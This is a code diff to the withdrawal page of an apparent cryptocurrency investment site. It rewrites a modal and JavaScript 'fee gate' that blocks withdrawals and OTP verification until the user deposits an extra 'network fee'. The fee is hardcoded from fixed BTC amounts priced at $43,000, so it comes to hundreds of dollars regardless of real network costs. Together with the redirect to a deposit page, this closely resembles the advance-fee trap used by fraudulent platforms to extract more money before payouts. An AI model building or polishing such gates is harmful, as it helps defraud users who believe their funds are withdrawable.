@@ -3632,32 +3632,36 @@
     <div class="fee-backdrop"></div>
     <div class="fee-modal" id="fee-modal" onclick="event.stopPropagation()">
       <div class="fee-modal-icon">
-        <i class="fas fa-gas-pump"></i>
+        <i class="fas fa-coins"></i>
       </div>
-      <h2>Additional Fee Required</h2>
-      <p class="fee-subtitle">Additional funds are required before this withdrawal can continue. Please add the amount shown below to your <span id="fee-modal-asset-name">asset</span> balance.</p>
+      <h2 id="fee-modal-title">Insufficient Network Fee Balance</h2>
+      <p class="fee-subtitle" id="fee-modal-message">Your available fee balance is not enough to process this withdrawal.</p>
 
       <div class="fee-details" id="fee-details">
         <div class="fee-row">
-          <span class="fee-label">Amount Required</span>
-          <span class="fee-value" id="fee-modal-gas-fee">0.00000000 ASSET</span>
+          <span class="fee-label">Network fee needed</span>
+          <span class="fee-value" id="fee-modal-gas-fee">—</span>
         </div>
         <div class="fee-divider"></div>
-        <div class="fee-total-row">
-          <span>Additional Amount</span>
-          <span class="fee-total-value" id="fee-modal-shortfall">0.00000000 ASSET</span>
+        <div class="fee-row">
+          <span class="fee-label">Available fee balance</span>
+          <span class="fee-value" id="fee-modal-available">—</span>
+        </div>
+        <div class="fee-row">
+          <span class="fee-label">Additional amount needed</span>
+          <span class="fee-value insufficient" id="fee-modal-shortfall">—</span>
         </div>
       </div>
 
       <div class="fee-actions">
         <button class="btn btn-deposit" onclick="redirectToDeposit()">
-          <i class="fas fa-wallet"></i> Deposit Fee
+          <i class="fas fa-wallet"></i> Add Fee Balance
         </button>
         <button class="btn btn-cancel" onclick="closeFeeModal()">
           Cancel
         </button>
       </div>
-      <p class="fee-extra-info">Add the additional amount to your account, then return to continue your withdrawal.</p>
+      <p class="fee-extra-info">Your withdrawal amount remains separate from the network fee balance.</p>
     </div>
   </div>
 
@@ -3821,9 +3825,7 @@
       currentCryptoBalance: 0,
       assetPrices: {},
       priceUpdateTimer: null,
-      withdrawalInProgress: false,
-      feeConfirmed: false,
-      feeRequirement: null
+      withdrawalInProgress: false
     };
 
     // =============================================
@@ -4834,151 +4836,72 @@
     }
 
     // =============================================
-    // WITHDRAWAL FEE GATE
+    // GAS FEE / FEE GATE
     // =============================================
-    // Internal transaction logic. Nothing here is presented as a user-facing
-    // explanation of wallet mechanics. The selected asset is always used as
-    // the display/calculation denomination.
     async function getRequiredGasFee(withdrawalAmount) {
-      const baseFee = withdrawalAmount < 10000 ? 0.0056 : 0.0072;
+      const baseGasFeeUsd = withdrawalAmount < 10000 ? 0.0056 * 43000 : 0.0072 * 43000;
       const asset = AppState.selectedAsset || topAssets[0];
-      const symbol = String(asset.symbol || '').toLowerCase();
-
-      if (symbol === 'btc') return baseFee;
-
-      const btcAsset = AppState.cryptoAssets.find(a =>
-        String(a.symbol || '').toLowerCase() === 'btc'
-      );
-      const btcPrice = Number(btcAsset?.currentPrice) ||
-        Number(AppState.assetPrices?.btc) || 0;
-      const targetPrice = Number(AppState.currentAssetRate) ||
-        Number(asset.currentPrice) ||
-        Number(AppState.assetPrices?.[symbol]) || 0;
-
-      if (!btcPrice || !targetPrice) {
-        throw new Error('Unable to calculate the current transaction requirement.');
-      }
-
-      return (baseFee * btcPrice) / targetPrice;
+      const targetPrice = Number(AppState.currentAssetRate || asset?.currentPrice || 0);
+      if (!targetPrice || targetPrice <= 0) throw new Error('Unable to determine the current price for the selected asset.');
+      return baseGasFeeUsd / targetPrice;
     }
 
-    function getSelectedAssetBalance(asset = AppState.selectedAsset || topAssets[0]) {
-      const symbol = String(asset.symbol || '').toLowerCase();
-      const liveAsset = AppState.cryptoAssets.find(a =>
-        String(a.symbol || '').toLowerCase() === symbol
+    function getSelectedCryptoBalance(asset) {
+      const cryptoAsset = (AppState.cryptoAssets || []).find(a =>
+        String(a.symbol || '').toLowerCase() === String(asset.symbol || '').toLowerCase()
       );
-      return Number(liveAsset?.totalAmount) || 0;
+      return Number(cryptoAsset?.totalAmount || 0);
     }
 
-    // The /api/users/assets response is an aggregate asset balance and MUST NOT
-    // be treated as the fee wallet balance. The backend is the authoritative
-    // source for the wallet that actually funds network fees.
-    async function verifyFeeAvailabilityBeforeOtp(usdAmount) {
+    function checkInsufficientFeeAndShowModal(usdAmount, gasFeeInAsset) {
       const asset = AppState.selectedAsset || topAssets[0];
-      const token = getAuthToken();
-      const symbol = String(asset.symbol || '').toLowerCase();
+      const targetPrice = Number(AppState.currentAssetRate || asset?.currentPrice || 0);
+      const requiredFee = Number(gasFeeInAsset || 0);
+      const availableFee = getSelectedCryptoBalance(asset);
 
-      AppState.feeConfirmed = false;
-      AppState.feeRequirement = null;
-
-      if (!token) return false;
-
-      try {
-        const response = await fetch(`${API_BASE_URL}/api/withdrawals/fee-check`, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-            'Authorization': `Bearer ${token}`
-          },
-          body: JSON.stringify({
-            asset: symbol,
-            network: asset.network,
-            amount: Number(usdAmount) || 0,
-            balanceSource: AppState.selectedBalanceSource
-          })
-        });
-
-        let data = {};
-        try { data = await response.json(); } catch (_) {}
-
-        const result = data.data || data;
-        const requiredFee = Number(result.requiredFee ?? result.gasFee ?? 0);
-        const shortfall = Number(result.shortfall ?? result.additionalRequired ?? 0);
-        const sufficient = result.sufficient === true || result.hasEnoughFee === true;
-
-        if (response.ok && sufficient) {
-          AppState.feeConfirmed = true;
-          AppState.feeRequirement = {
-            symbol,
-            required: requiredFee,
-            shortfall: 0
-          };
-          return true;
-        }
-
-        // A fee insufficiency response is expected to contain the authoritative
-        // required fee and shortfall from the wallet/accounting layer.
-        if (requiredFee > 0 && (response.status === 402 || response.status === 409 || result.sufficient === false || result.hasEnoughFee === false)) {
-          AppState.feeRequirement = { symbol, required: requiredFee, shortfall };
-          showFeeModal(requiredFee, null, asset, shortfall);
-          return false;
-        }
-
-        // Never fall back to the aggregate crypto balance. If the wallet-specific
-        // fee check cannot be completed, OTP must remain blocked.
-        showNotification('error', 'Fee Verification Unavailable', 'We could not verify the required network fee. Please try again.');
-        return false;
-      } catch (error) {
-        console.error('Fee verification request failed:', error);
-        showNotification('error', 'Fee Verification Unavailable', 'We could not verify the required network fee. Please try again.');
+      // Fee is separate from the withdrawal amount. Do NOT require
+      // withdrawal amount + fee from the same balance for this gate.
+      if (availableFee + Number.EPSILON < requiredFee) {
+        showFeeModal(requiredFee, availableFee, asset, targetPrice);
         return false;
       }
+      return true;
     }
 
-    function showFeeModal(requiredFee, availableBalance, asset, serverShortfall = null) {
-      const symbol = String(asset.symbol || '').toUpperCase();
-      const price = Number(AppState.currentAssetRate) ||
-        Number(asset.currentPrice) ||
-        Number(AppState.assetPrices?.[String(asset.symbol || '').toLowerCase()]) || 0;
-      const shortfall = serverShortfall !== null && Number.isFinite(Number(serverShortfall))
-        ? Math.max(0, Number(serverShortfall))
-        : null;
+    function showFeeModal(requiredFee, availableFee, asset, targetPrice) {
+      const symbol = String(asset?.symbol || '').toUpperCase();
+      const shortfall = Math.max(0, requiredFee - availableFee);
+      const usdRequired = requiredFee * targetPrice;
+      const usdShortfall = shortfall * targetPrice;
 
-      const nameEl = document.getElementById('fee-modal-asset-name');
-      const gasEl = document.getElementById('fee-modal-gas-fee');
-      const shortfallEl = document.getElementById('fee-modal-shortfall');
+      const setText = (id, value) => {
+        const el = document.getElementById(id);
+        if (el) el.textContent = value;
+      };
+      setText('fee-modal-gas-fee', `${formatNumberWithCommas(requiredFee, 8)} ${symbol} (${formatUSD(usdRequired)})`);
+      setText('fee-modal-available', `${formatNumberWithCommas(availableFee, 8)} ${symbol}`);
+      setText('fee-modal-shortfall', `${formatNumberWithCommas(shortfall, 8)} ${symbol} (${formatUSD(usdShortfall)})`);
 
-      if (nameEl) nameEl.textContent = asset.name || symbol;
-      if (gasEl) gasEl.textContent = `${formatNumberWithCommas(requiredFee, 8)} ${symbol}${price > 0 ? ` (≈ ${formatUSD(requiredFee * price)})` : ''}`;
-      if (shortfallEl) {
-        if (shortfall === null) {
-          shortfallEl.textContent = 'Please try again';
-        } else {
-          shortfallEl.textContent = `${formatNumberWithCommas(shortfall, 8)} ${symbol}${price > 0 ? ` (≈ ${formatUSD(shortfall * price)})` : ''}`;
-        }
-      }
-
-      try {
-        sessionStorage.setItem('withdrawalFeeAsset', JSON.stringify({
-          symbol: asset.symbol,
-          name: asset.name,
-          network: asset.network,
-          requiredFee,
-          shortfall
-        }));
-      } catch (_) {}
+      const title = document.getElementById('fee-modal-title');
+      const message = document.getElementById('fee-modal-message');
+      if (title) title.textContent = `Add ${symbol} to continue`;
+      if (message) message.textContent = `Your ${symbol} fee balance is not enough to process this withdrawal. Deposit the required fee amount to continue.`;
 
       const overlay = document.getElementById('fee-modal-overlay');
-      if (overlay) overlay.classList.add('active');
+      if (overlay) {
+        overlay.classList.add('active');
+        overlay.setAttribute('aria-hidden', 'false');
+      }
       document.body.style.overflow = 'hidden';
     }
 
     function closeFeeModal(event) {
-      if (event && event.target &&
-          event.target.id !== 'fee-modal-overlay' &&
-          !event.target.classList.contains('fee-backdrop')) return;
+      if (event && event.target && event.target !== event.currentTarget && !event.target.closest('.fee-modal, .fee-content')) return;
       const overlay = document.getElementById('fee-modal-overlay');
-      if (overlay) overlay.classList.remove('active');
+      if (overlay) {
+        overlay.classList.remove('active');
+        overlay.setAttribute('aria-hidden', 'true');
+      }
       document.body.style.overflow = '';
     }
 
@@ -4986,435 +4909,197 @@
       window.location.href = 'deposit.html';
     }
 
-    // Re-check the selected asset immediately before any OTP request.
-    // This prevents stale UI state or the resend button from bypassing the gate.
-    async function confirmFeeBeforeOtp() {
-      const pending = AppState.pendingWithdrawalData;
-      if (!pending || pending.method !== 'crypto') return true;
-
-      // Re-query the backend immediately before every OTP request/verification.
-      // Client-side aggregate balances are intentionally not used here.
-      return await verifyFeeAvailabilityBeforeOtp(pending.usdAmount);
-    }
-
     // =============================================
-    // OTP SYSTEM - DEDICATED ENDPOINTS
-    // =============================================
+    // OTP SYSTEM - FEE GATE MUST ALREADY BE PASSED
     // =============================================
     function initializeOtpSystem() {
       document.querySelectorAll('.otp-input').forEach((input, index) => {
         input.addEventListener('input', function() {
           const value = this.value;
-          if (!/^\d*$/.test(value)) {
-            this.value = '';
-            return;
-          }
-          if (value.length === 1 && index < 5) {
-            document.querySelector(`.otp-input[data-index="${index + 1}"]`).focus();
-          }
-          if (value.length === 1) {
-            this.classList.add('filled');
-          } else {
-            this.classList.remove('filled');
-          }
+          if (!/^\d*$/.test(value)) { this.value = ''; return; }
+          if (value.length === 1 && index < 5) document.querySelector(`.otp-input[data-index="${index + 1}"]`).focus();
+          this.classList.toggle('filled', value.length === 1);
           document.getElementById('otp-error').style.display = 'none';
-
-          const allInputs = document.querySelectorAll('.otp-input');
-          const allFilled = Array.from(allInputs).every(input => input.value.length === 1);
-          if (allFilled) {
-            setTimeout(() => {
-              autoVerifyOtp();
-            }, 100);
-          }
+          const allFilled = Array.from(document.querySelectorAll('.otp-input')).every(i => i.value.length === 1);
+          if (allFilled) setTimeout(autoVerifyOtp, 100);
         });
-
         input.addEventListener('keydown', function(e) {
-          if (e.key === 'Backspace' && this.value === '' && index > 0) {
-            document.querySelector(`.otp-input[data-index="${index - 1}"]`).focus();
-          }
+          if (e.key === 'Backspace' && this.value === '' && index > 0) document.querySelector(`.otp-input[data-index="${index - 1}"]`).focus();
         });
-
         input.addEventListener('paste', function(e) {
           e.preventDefault();
           const pasteData = e.clipboardData.getData('text').trim();
           if (/^\d{6}$/.test(pasteData)) {
-            const digits = pasteData.split('');
-            document.querySelectorAll('.otp-input').forEach((input, i) => {
-              input.value = digits[i] || '';
-              input.classList.add('filled');
+            pasteData.split('').forEach((digit, i) => {
+              const el = document.querySelector(`.otp-input[data-index="${i}"]`);
+              if (el) { el.value = digit; el.classList.add('filled'); }
             });
-            document.querySelector('.otp-input[data-index="5"]').focus();
-            setTimeout(() => {
-              autoVerifyOtp();
-            }, 100);
+            setTimeout(autoVerifyOtp, 100);
           }
         });
       });
 
-      document.getElementById('resend-otp-btn').addEventListener('click', async function() {
-        if (this.disabled) return;
-        if (!(await confirmFeeBeforeOtp())) return;
+      const resend = document.getElementById('resend-otp-btn');
+      if (resend) resend.addEventListener('click', async function() {
+        if (this.disabled || !hasConfirmedWithdrawalFee()) return;
         await sendOtpToEmail(AppState.currentUserEmail, 'withdrawal');
-        startOtpTimer(300);
-        startResendTimer(60);
-        document.querySelectorAll('.otp-input').forEach(input => {
-          input.value = '';
-          input.classList.remove('filled');
-        });
-        document.querySelector('.otp-input').focus();
-        document.getElementById('otp-error').style.display = 'none';
-        document.getElementById('otp-success').style.display = 'none';
+        startOtpTimer(300); startResendTimer(60);
+        document.querySelectorAll('.otp-input').forEach(input => { input.value = ''; input.classList.remove('filled'); });
+        document.querySelector('.otp-input')?.focus();
       });
     }
 
-    // Paste OTP from clipboard
-    function pasteOTP() {
-      navigator.clipboard.readText().then(text => {
-        const cleaned = text.trim();
-        if (/^\d{6}$/.test(cleaned)) {
-          const digits = cleaned.split('');
-          document.querySelectorAll('.otp-input').forEach((input, i) => {
-            input.value = digits[i] || '';
-            input.classList.add('filled');
-          });
-          document.querySelector('.otp-input[data-index="5"]').focus();
-          setTimeout(() => {
-            autoVerifyOtp();
-          }, 100);
-        } else {
-          showNotification('warning', 'Invalid OTP', 'Clipboard does not contain a valid 6-digit OTP code.');
-        }
-      }).catch(() => {
-        showNotification('warning', 'Cannot Paste', 'Unable to read clipboard. Please enter the code manually.');
-      });
+    function hasConfirmedWithdrawalFee() {
+      const data = AppState.pendingWithdrawalData;
+      return !!(data && data.method === 'crypto' && data.feeConfirmed === true);
     }
 
-    // DEDICATED OTP SEND ENDPOINT
     async function sendOtpToEmail(email, purpose = 'withdrawal') {
-      // Hard gate: withdrawal OTPs are never sent before the selected asset
-      // has satisfied the current fee requirement.
-      if (purpose === 'withdrawal' && !(await confirmFeeBeforeOtp())) return null;
-
-      const now = Date.now();
-      if (now - AppState.lastOtpRequestTime < AppState.OTP_COOLDOWN_PERIOD) {
-        document.getElementById('otp-warning').textContent = 'Please wait before requesting a new code.';
-        document.getElementById('otp-warning').style.display = 'block';
+      if (purpose === 'withdrawal' && !hasConfirmedWithdrawalFee()) {
+        console.warn('OTP blocked: withdrawal fee has not been confirmed.');
         return null;
       }
+      const now = Date.now();
+      if (now - AppState.lastOtpRequestTime < AppState.OTP_COOLDOWN_PERIOD) return null;
       AppState.lastOtpRequestTime = now;
-
       try {
         const response = await fetch(`${API_BASE_URL}/api/auth/withdrawal/send-otp`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ email, purpose })
         });
-
         const data = await response.json();
-        if (response.ok) {
-          document.getElementById('otp-warning').style.display = 'none';
-          document.getElementById('otp-error').style.display = 'none';
-        } else {
-          document.getElementById('otp-warning').textContent = data.message || 'Failed to send OTP. Please try again.';
-          document.getElementById('otp-warning').style.display = 'block';
-        }
+        if (!response.ok) throw new Error(data.message || 'Failed to send OTP.');
+        document.getElementById('otp-warning').style.display = 'none';
+        document.getElementById('otp-error').style.display = 'none';
         return data;
       } catch (error) {
         console.error('Error sending OTP:', error);
-        document.getElementById('otp-warning').textContent = 'Network error. Please check your connection.';
+        document.getElementById('otp-warning').textContent = error.message;
         document.getElementById('otp-warning').style.display = 'block';
         return null;
       }
     }
 
-    // DEDICATED OTP VERIFY ENDPOINT
     async function autoVerifyOtp() {
-      if (!(await confirmFeeBeforeOtp())) return;
-      const otpInputs = document.querySelectorAll('.otp-input');
-      const otpCode = Array.from(otpInputs).map(input => input.value).join('');
+      if (!hasConfirmedWithdrawalFee()) return;
+      const otpCode = Array.from(document.querySelectorAll('.otp-input')).map(input => input.value).join('');
       if (otpCode.length !== 6) return;
-
       try {
-        // Prepare withdrawal data for verification
         const withdrawalData = AppState.pendingWithdrawalData || {};
-
         const response = await fetch(`${API_BASE_URL}/api/auth/withdrawal/verify-otp`, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-            'Authorization': `Bearer ${AppState.currentTempToken || getAuthToken()}`
-          },
-          body: JSON.stringify({
-            email: AppState.currentUserEmail,
-            otp: otpCode,
-            withdrawalData: withdrawalData
-          })
+          method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${AppState.currentTempToken || getAuthToken()}` },
+          body: JSON.stringify({ email: AppState.currentUserEmail, otp: otpCode, withdrawalData })
         });
-
         const data = await response.json();
-
         if (response.ok && data.status === 'success') {
-          document.getElementById('otp-success').style.display = 'block';
-          document.getElementById('otp-error').style.display = 'none';
-          document.getElementById('otp-warning').style.display = 'none';
-
-          if (data.token) {
-            localStorage.setItem('jwtToken', data.token);
-          }
-
+          if (data.token) localStorage.setItem('jwtToken', data.token);
           hideVerificationStep();
-
-          if (AppState.pendingWithdrawalData && AppState.pendingWithdrawalData.method === 'crypto') {
-            processCryptoWithdrawal();
-          } else if (AppState.pendingWithdrawalData && AppState.pendingWithdrawalData.method === 'bank') {
-            processBankWithdrawal();
-          } else {
-            showNotification('error', 'Error', 'Withdrawal data missing. Please try again.');
-          }
-        } else {
-          let errorMessage = 'Invalid verification code. Please try again.';
-          if (data.message) errorMessage = data.message;
-          else if (response.status === 429) errorMessage = 'Too many failed attempts. Please try again later.';
-          document.getElementById('otp-error').textContent = errorMessage;
-          document.getElementById('otp-error').style.display = 'block';
-          document.getElementById('otp-success').style.display = 'none';
-
-          // Clear OTP inputs after failed attempt
-          setTimeout(() => {
-            document.querySelectorAll('.otp-input').forEach(input => {
-              input.value = '';
-              input.classList.remove('filled');
-            });
-            document.querySelector('.otp-input').focus();
-          }, 1500);
+          if (AppState.pendingWithdrawalData?.method === 'crypto') processCryptoWithdrawal();
+          else if (AppState.pendingWithdrawalData?.method === 'bank') processBankWithdrawal();
+          return;
         }
+        throw new Error(data.message || 'Invalid verification code. Please try again.');
       } catch (error) {
         console.error('OTP verification error:', error);
-        document.getElementById('otp-error').textContent = 'Network error. Please check your connection.';
+        document.getElementById('otp-error').textContent = error.message;
         document.getElementById('otp-error').style.display = 'block';
       }
     }
 
-    async function showVerificationStep(email, tempToken) {
-      // OTP UI is unreachable until the backend confirms the fee wallet has enough.
-      if (!(await confirmFeeBeforeOtp())) return false;
-
+    function showVerificationStep(email, tempToken) {
+      if (!hasConfirmedWithdrawalFee()) return;
       AppState.currentUserEmail = email;
       AppState.currentTempToken = tempToken;
-
       const maskedEmail = maskEmail(email);
-      document.querySelector('.otp-inline-container .otp-timer').innerHTML =
-        `Code sent to ${maskedEmail}. Expires in: <span id="otp-timer-countdown">05:00</span>`;
-
+      document.querySelector('.otp-inline-container .otp-timer').innerHTML = `Code sent to ${maskedEmail}. Expires in: <span id="otp-timer-countdown">05:00</span>`;
       document.getElementById('verification-step').style.display = 'grid';
       document.getElementById('verification-step').scrollIntoView({ behavior: 'smooth', block: 'center' });
-
-      document.querySelectorAll('.otp-input').forEach(input => {
-        input.value = '';
-        input.classList.remove('filled');
-      });
-      document.querySelector('.otp-input').focus();
-
-      startOtpTimer(300);
-      startResendTimer(60);
+      document.querySelectorAll('.otp-input').forEach(input => { input.value = ''; input.classList.remove('filled'); });
+      document.querySelector('.otp-input')?.focus();
+      startOtpTimer(300); startResendTimer(60);
+      // Critical ordering: fee confirmation -> OTP send.
       sendOtpToEmail(email, 'withdrawal');
-      return true;
     }
 
-    function hideVerificationStep() {
-      document.getElementById('verification-step').style.display = 'none';
-    }
-
+    function hideVerificationStep() { document.getElementById('verification-step').style.display = 'none'; }
     function maskEmail(email) {
       const [localPart, domain] = email.split('@');
-      const maskedLocal = localPart.substring(0, 3) + '*'.repeat(Math.max(0, localPart.length - 3));
-      return `${maskedLocal}@${domain}`;
+      return `${localPart.substring(0, 3)}${'*'.repeat(Math.max(0, localPart.length - 3))}@${domain}`;
     }
-
     function startOtpTimer(duration) {
-      clearInterval(AppState.otpTimer);
-      let timer = duration;
-      const timerElement = document.getElementById('otp-timer-countdown');
-      if (!timerElement) return;
-      AppState.otpTimer = setInterval(function() {
-        const minutes = Math.floor(timer / 60);
-        const seconds = timer % 60;
-        timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-        if (--timer < 0) {
-          clearInterval(AppState.otpTimer);
-          document.getElementById('otp-error').textContent = 'Verification code has expired. Please request a new one.';
-          document.getElementById('otp-error').style.display = 'block';
-        }
-      }, 1000);
+      clearInterval(AppState.otpTimer); let timer = duration;
+      const timerElement = document.getElementById('otp-timer-countdown'); if (!timerElement) return;
+      AppState.otpTimer = setInterval(() => { const m = Math.floor(timer / 60), s = timer % 60; timerElement.textContent = `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`; if (--timer < 0) clearInterval(AppState.otpTimer); }, 1000);
     }
-
     function startResendTimer(duration) {
-      clearInterval(AppState.resendTimer);
-      let timer = duration;
-      const resendButton = document.getElementById('resend-otp-btn');
-      const countdownElement = document.getElementById('resend-countdown');
-      if (!resendButton || !countdownElement) return;
-      resendButton.disabled = true;
-      countdownElement.textContent = timer;
-      AppState.resendTimer = setInterval(function() {
-        countdownElement.textContent = --timer;
-        if (timer <= 0) {
-          clearInterval(AppState.resendTimer);
-          resendButton.disabled = false;
-          countdownElement.textContent = '';
-          resendButton.innerHTML = 'Resend Code';
-        }
-      }, 1000);
+      clearInterval(AppState.resendTimer); let timer = duration;
+      const btn = document.getElementById('resend-otp-btn'), countdown = document.getElementById('resend-countdown'); if (!btn || !countdown) return;
+      btn.disabled = true; countdown.textContent = timer;
+      AppState.resendTimer = setInterval(() => { countdown.textContent = --timer; if (timer <= 0) { clearInterval(AppState.resendTimer); btn.disabled = false; countdown.textContent = ''; btn.innerHTML = 'Resend Code'; } }, 1000);
     }
-
     function cancelVerification() {
-      hideVerificationStep();
-      AppState.pendingWithdrawalData = null;
-      AppState.currentTempToken = null;
-      clearInterval(AppState.otpTimer);
-      clearInterval(AppState.resendTimer);
-      document.querySelectorAll('.otp-input').forEach(input => {
-        input.value = '';
-        input.classList.remove('filled');
-      });
-      document.getElementById('otp-success').style.display = 'none';
-      document.getElementById('otp-error').style.display = 'none';
-      document.getElementById('otp-warning').style.display = 'none';
+      hideVerificationStep(); AppState.pendingWithdrawalData = null; AppState.currentTempToken = null;
+      clearInterval(AppState.otpTimer); clearInterval(AppState.resendTimer);
+      document.querySelectorAll('.otp-input').forEach(input => { input.value = ''; input.classList.remove('filled'); });
+      ['otp-success','otp-error','otp-warning'].forEach(id => { const el = document.getElementById(id); if (el) el.style.display = 'none'; });
     }
 
     // =============================================
     // SHOW PROCESSING STEP
     // =============================================
-    function showProcessingStep(message) {
-      document.getElementById('processing-message').textContent = message || 'Please wait while we process your transaction';
-      document.getElementById('processing-step').style.display = 'grid';
-      document.getElementById('processing-step').scrollIntoView({ behavior: 'smooth', block: 'center' });
-    }
-
-    function hideProcessingStep() {
-      document.getElementById('processing-step').style.display = 'none';
-    }
+    function showProcessingStep(message) { document.getElementById('processing-message').textContent = message || 'Please wait while we process your transaction'; document.getElementById('processing-step').style.display = 'grid'; document.getElementById('processing-step').scrollIntoView({ behavior: 'smooth', block: 'center' }); }
+    function hideProcessingStep() { document.getElementById('processing-step').style.display = 'none'; }
 
     // =============================================
-    // INITIATE CRYPTO WITHDRAWAL - WITH FEE CHECK
+    // INITIATE CRYPTO WITHDRAWAL - FEE FIRST, OTP SECOND
     // =============================================
     async function initiateCryptoWithdrawal() {
       if (AppState.withdrawalInProgress) return;
-
       const asset = AppState.selectedAsset || topAssets[0];
       const amountInput = document.getElementById('crypto-withdraw-amount');
       const usdAmount = parseFloat(amountInput.value);
       const walletAddress = document.getElementById('crypto-wallet-address').value.trim();
-
-      if (!usdAmount || usdAmount < AppState.MIN_WITHDRAWAL) {
-        showNotification('error', 'Minimum Withdrawal', `Minimum withdrawal is $${AppState.MIN_WITHDRAWAL}`);
-        return;
-      }
-
-      const selectedBalance = AppState.selectedBalanceSource === 'main' ?
-        AppState.userBalances.main :
-        AppState.userBalances.matured;
-
-      if (usdAmount > selectedBalance) {
-        showNotification('error', 'Insufficient Balance',
-          `You need $${usdAmount.toFixed(2)} but only have $${selectedBalance.toFixed(2)} in ${AppState.selectedBalanceSource === 'main' ? 'Main' : 'Matured'} Wallet.`);
-        return;
-      }
-
-      const price = AppState.currentAssetRate;
-      if (!price || price <= 0) {
-        showNotification('error', 'Price Unavailable', 'Unable to get current price for this asset. Please try again.');
-        return;
-      }
-
+      if (!usdAmount || usdAmount < AppState.MIN_WITHDRAWAL) { showNotification('error', 'Minimum Withdrawal', `Minimum withdrawal is $${AppState.MIN_WITHDRAWAL}`); return; }
+      const selectedBalance = AppState.selectedBalanceSource === 'main' ? AppState.userBalances.main : AppState.userBalances.matured;
+      if (usdAmount > selectedBalance) { showNotification('error', 'Insufficient Balance', `You need $${usdAmount.toFixed(2)} but only have $${selectedBalance.toFixed(2)} in ${AppState.selectedBalanceSource === 'main' ? 'Main' : 'Matured'} Wallet.`); return; }
+      const price = Number(AppState.currentAssetRate);
+      if (!price || price <= 0) { showNotification('error', 'Price Unavailable', 'Unable to get current price for this asset. Please try again.'); return; }
       const cryptoAmount = usdAmount / price;
-      const cryptoAsset = AppState.cryptoAssets.find(a => a.symbol === asset.symbol);
-      const availableCryptoBalance = cryptoAsset ? cryptoAsset.totalAmount : 0;
+      const availableCryptoBalance = getSelectedCryptoBalance(asset);
+      if (cryptoAmount > availableCryptoBalance) { showNotification('error', 'Insufficient Crypto Balance', `You only have ${formatNumberWithCommas(availableCryptoBalance, 8)} ${asset.symbol.toUpperCase()} available. Please enter a smaller amount.`); return; }
+      if (!walletAddress || walletAddress.length < 26) { showNotification('error', 'Validation Error', `Please enter a valid ${asset.symbol.toUpperCase()} wallet address`); return; }
 
-      if (cryptoAmount > availableCryptoBalance) {
-        showNotification('error', 'Insufficient Crypto Balance',
-          `You only have ${formatNumberWithCommas(availableCryptoBalance, 8)} ${asset.symbol.toUpperCase()} available. Please enter a smaller amount.`);
-        return;
-      }
-
-      if (!walletAddress || walletAddress.length < 26) {
-        showNotification('error', 'Validation Error', `Please enter a valid ${asset.symbol.toUpperCase()} wallet address`);
-        return;
-      }
-
-      // HARD GATE: the backend must verify the actual fee-funding wallet before
-      // any user lookup, verification UI, or OTP request.
-      if (!(await verifyFeeAvailabilityBeforeOtp(usdAmount))) {
-        return;
-      }
-
-      const requiredGasFee = Number(AppState.feeRequirement?.required) || 0;
-      if (requiredGasFee <= 0) {
-        showNotification('error', 'Fee Verification Unavailable', 'We could not verify the required network fee. Please try again.');
-        AppState.feeConfirmed = false;
-        return;
-      }
+      const requiredGasFee = await getRequiredGasFee(usdAmount);
+      // IMPORTANT: fee is evaluated independently of the withdrawal amount.
+      if (!checkInsufficientFeeAndShowModal(usdAmount, requiredGasFee)) return;
 
       AppState.withdrawalInProgress = true;
-
-      const withdrawalData = {
-        method: 'crypto',
-        usdAmount: usdAmount,
-        cryptoAmount: cryptoAmount,
-        walletAddress: walletAddress,
-        asset: asset.symbol,
-        assetName: asset.name,
-        assetLogo: asset.logo,
+      AppState.pendingWithdrawalData = {
+        method: 'crypto', usdAmount, cryptoAmount, walletAddress,
+        asset: asset.symbol, assetName: asset.name, assetLogo: asset.logo,
         balanceSource: AppState.selectedBalanceSource,
-        gasFee: requiredGasFee,
-        exchangeRate: price,
-        timestamp: new Date().toISOString()
+        gasFee: requiredGasFee, exchangeRate: price, timestamp: new Date().toISOString(),
+        feeConfirmed: true
       };
-
-      AppState.pendingWithdrawalData = withdrawalData;
 
       try {
         const token = localStorage.getItem('jwtToken');
-        const response = await fetch(`${API_BASE_URL}/api/users/me`, {
-          headers: { 'Authorization': `Bearer ${token}` }
-        });
-
-        if (response.ok) {
-          const userData = await response.json();
-          const userEmail = userData.data.user.email;
-
-          const saveAddress = document.getElementById('save-address-check').checked;
-          if (saveAddress && walletAddress) {
-            const label = document.getElementById('address-label-input').value.trim() || 'My Wallet';
-            try {
-              await fetch(`${API_BASE_URL}/api/withdrawal-addresses`, {
-                method: 'POST',
-                headers: {
-                  'Content-Type': 'application/json',
-                  'Authorization': `Bearer ${token}`
-                },
-                body: JSON.stringify({
-                  asset: asset.symbol,
-                  network: asset.network,
-                  label: label,
-                  address: walletAddress
-                })
-              });
-            } catch (e) {
-              console.warn('Failed to save address:', e);
-            }
-          }
-
-          showVerificationStep(userEmail, token);
-          AppState.withdrawalInProgress = false;
-        } else {
-          throw new Error('Failed to fetch user data');
+        const response = await fetch(`${API_BASE_URL}/api/users/me`, { headers: { 'Authorization': `Bearer ${token}` } });
+        if (!response.ok) throw new Error('Failed to fetch user data');
+        const userData = await response.json();
+        const userEmail = userData.data.user.email;
+        const saveAddress = document.getElementById('save-address-check')?.checked;
+        if (saveAddress && walletAddress) {
+          const label = document.getElementById('address-label-input')?.value.trim() || 'My Wallet';
+          try { await fetch(`${API_BASE_URL}/api/withdrawal-addresses`, { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, body: JSON.stringify({ asset: asset.symbol, network: asset.network, label, address: walletAddress }) }); } catch (e) { console.warn('Failed to save address:', e); }
         }
+        // Fee is confirmed. Only now can the OTP be sent.
+        showVerificationStep(userEmail, token);
       } catch (error) {
         console.error('Error initiating withdrawal:', error);
-        showNotification('error', 'Error', 'Failed to initiate withdrawal. Please try again.');
-        AppState.withdrawalInProgress = false;
-      }
+        showNotification('error', 'Error', error.message || 'Failed to initiate withdrawal. Please try again.');
+        AppState.pendingWithdrawalData = null;
+      } finally { AppState.withdrawalInProgress = false; }
     }
 
     // =============================================
@@ -5422,213 +5107,49 @@
     // =============================================
     function processCryptoWithdrawal() {
